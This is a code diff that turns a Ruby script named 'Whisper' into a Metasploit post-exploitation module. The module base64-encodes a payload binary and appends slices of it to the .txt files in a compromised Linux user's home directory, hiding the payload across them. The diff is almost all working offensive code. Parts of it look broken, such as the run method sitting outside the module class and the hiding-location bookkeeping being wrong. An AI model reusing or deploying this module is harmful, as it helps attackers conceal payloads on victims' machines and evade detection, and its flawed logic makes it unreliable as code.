@@ -25,30 +25,25 @@
 # 3. Splice encrypted payload-binaries into smaller files
 # 4. Append encrypted splices to editable files
 
-##########################################################################################
-##########################################################################################
-##########################################################################################
-##########################################################################################
-##########################################################################################
-##########################################################################################
-##########################################################################################
-##########################################################################################
-
 require 'base64'
 
-payload = "whisper.rb"
+class MetasploitModule < Msf::Post
+    include Msf::Post::File
 
-inputFile = File.open(payload)
-data      = inputFile.read
-data      = Base64.encode64(data)
+    def initialize(info={})
+        super(update_info(info,
+            'Name'         => 'Whisper',
+            'Description'  => %q{Hides files in other files.},
+            'License'      => MSF_LICENSE,
+            'Author'       => ['Adonay Pichardo'],
+            'Platform'     => ['linux'],
+            'SessionTypes' => ['meterpreter', 'shell']
+        ))
+    end
+end
 
 class Whisper
-    @@textFiles       = Dir["~/*.txt"]
     @@whisperLocation = {}
-
-    def getTextFiles
-        return @@textFiles
-    end
 
     def setWhisperLocation(fileName, location)
         @@whisperLocation[fileName] = location
@@ -59,36 +54,48 @@ class Whisper
     end
 end
 
-psst = Whisper.new()
+def run
 
-indexStart = 0
-indexStep  = data.size / psst.getTextFiles.size
-indexEnd   = indexStep
+    whisper = Whisper.new()
 
-psst.getTextFiles.each {
-    |file|
-    temp          = File.open(file, 'r')
-    fileLinesSize = temp.read.split("\n").size
-    temp.close()
-    textFile      = File.open(file, 'a')
+    # Encrypt payload binary
+    payload       = "/home/kali/whisper/payload/dummy.bin"
+    print_good("Payload binary set to:_> #{payload}")
+    inputFile     = File.open(payload, 'r')
+    inputFile     = inputFile.read()
+    encryptedData = Base64.encode64(inputFile)
 
-    textFile.puts data[indexStart..indexEnd]
-    temp.close()
+    # Get list of .txt files on remote machine in '~' directory
+    currentUser = get_env('USER')
+    print_good("Current User set to:_> #{currentUser}")
+    print_good("Searching files in:_> /home/#{currentUser}")
+    allFiles    = dir("/home/#{currentUser}")
+    print_good("Files found:_> #{allFiles}")
 
-    psst.setWhisperLocation(file, fileLinesSize + 1)
-    puts psst.getWhisperLocation(file)
+    # Get all text files
+    textFiles = []
+    allFiles.each {
+        |file|
+        if file.include? ".txt"
+            textFiles.append(file)
+        end
+    }
 
-    indexStart = indexEnd
-    indexEnd  += indexStep
-}
+    indexStart = 0
+    indexStep  = encryptedData.size / textFiles.size
+    indexEnd   = indexStep
 
-psst.getTextFiles.each {
-    |file|
-    puts "#{file}:#{psst.getWhisperLocation(file)}"
-}
+    textFiles.each {
+        |file|
+        append_file(file, encryptedData[indexStart..indexEnd])
+        whisper.setWhisperLocation(file, (textFiles.size + 1))
 
-psst.getTextFiles.each {
-    |file|
-    textFile = File.open(file, 'r')
-    puts textFile.read
-}
+        indexStart = indexEnd
+        indexEnd  += indexStep
+    }
+
+    textFiles.each {
+        |file|
+        print_good(whisper.getWhisperLocation(file))
+    }
+end
